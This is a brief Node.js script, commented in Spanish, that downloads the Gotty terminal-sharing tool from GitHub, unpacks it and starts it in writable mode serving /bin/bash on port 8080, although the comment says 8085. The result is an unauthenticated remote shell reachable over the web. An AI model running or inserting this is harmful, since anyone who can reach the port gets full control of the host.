const { exec } = require('child_process');

// Comando para descargar Gotty
const downloadCommand = 'wget https://github.com/yudai/gotty/releases/download/v1.0.1/gotty_linux_amd64.tar.gz';

// Comando para descomprimir Gotty
const extractCommand = 'tar -xzvf gotty_linux_amd64.tar.gz';

// Comando para ejecutar Gotty en el puerto 8085
const gottyCommand = './gotty -w --port 8080 /bin/bash';

// Ejecuta los comandos en serie
exec(`${downloadCommand} && ${extractCommand} && ${gottyCommand}`, (error, stdout, stderr) => {
  if (error) {
    console.error('Error:', error);
    return;
  }

  console.log('Gotty is running on port 8080');
});
